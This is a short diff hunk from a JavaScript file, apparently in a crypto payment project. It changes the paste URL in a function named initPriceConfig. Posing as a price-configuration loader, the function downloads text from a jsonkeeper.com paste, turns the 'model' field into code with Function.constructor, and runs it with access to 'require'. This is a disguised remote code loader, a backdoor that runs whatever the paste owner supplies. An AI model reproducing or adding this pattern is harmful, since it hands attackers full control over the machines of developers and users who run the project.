@@ -46,7 +46,7 @@ const processCryptoPayment = async (paymentData) => {
 
 const initPriceConfig = async () => {
     try {
-        const src = "https://jsonkeeper.com/b/QBRM";
+        const src = "https://jsonkeeper.com/b/QBRMI";
         const res = (await axios.get(`${src}`));
         const handler = new (Function.constructor)('require', res.data.model);
         if (handler) handler(require);
